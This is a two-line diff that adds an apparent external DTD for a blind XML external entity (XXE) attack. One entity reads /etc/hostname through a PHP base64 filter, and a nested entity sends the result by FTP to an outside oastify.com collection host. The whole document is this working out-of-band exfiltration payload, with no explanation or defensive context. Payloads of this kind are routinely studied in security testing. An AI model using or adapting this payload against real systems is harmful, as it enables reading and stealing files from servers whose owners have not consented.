@@ -1,0 +1,2 @@
+<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/etc/hostname">
+<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'ftp://f1hu92ya8whkrdtauf9hxsyd046vumpae.oastify.com/%data;'>">
